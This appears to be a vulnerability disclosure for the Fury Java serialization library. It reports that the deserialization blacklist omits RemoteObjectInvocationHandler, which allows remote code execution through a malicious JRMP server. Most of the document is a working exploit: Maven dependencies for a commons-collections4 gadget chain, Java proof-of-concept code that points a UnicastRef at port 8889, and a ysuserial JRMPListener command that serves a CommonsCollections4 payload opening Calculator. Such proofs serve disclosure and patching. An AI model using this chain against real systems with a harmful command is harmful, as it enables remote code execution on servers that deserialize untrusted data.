一、Description：
The open source component fury deserialization blacklist exists to bypass execution commands. 
The blacklist lacks the RemoteObjectInitationHandler class. 
This class can be used as a JRMP client to initiate a request to a malicious JRMP server. 
The JRMP server returns a serialized object, and the JRMP client deserializes it. cause the command to be executed.
二、Proof：
1、build environment
Create a new maven project and import dependencies:
<dependency>
 <groupId>org.furyio</groupId>
 <artifactId>fury-core</artifactId>
 <version>0.1.0-alpha.2</version>
</dependency>
<!--RCE with CC4-->
<dependency>
 <groupId>org.apache.commons</groupId>
 <artifactId>commons-collections4</artifactId>
 <version>4.0</version>
</dependency>
2、POC
ObjID id = new ObjID(new Random().nextInt()); // RMI registry
TCPEndpoint te = new TCPEndpoint("0.0.0.0", 8889);
UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
// Note that Fury instances should be reused between
// multiple serializations of different objects.
{
Fury fury = Fury.builder().withLanguage(Language.JAVA).withSecureMode(false)
// Allow to deserialize objects unknown types,
 // more flexible but less secure.
 // .withSecureMode(false)
 .build();
// Registering types can reduce class name serialization overhead, but not mandatory.
 // If secure mode enabled, all custom types must be registered.
 byte[] bytes = fury.serialize(obj);
System.out.println(fury.deserialize(bytes));
}
3、start a yso process
java -cp ysuserial-1.5-su18-all.jar org.su18.ysuserial.exploit.JRMPListener 8889 -g CommonsCollections4 -p "open -a Calculator"
4、run poc program
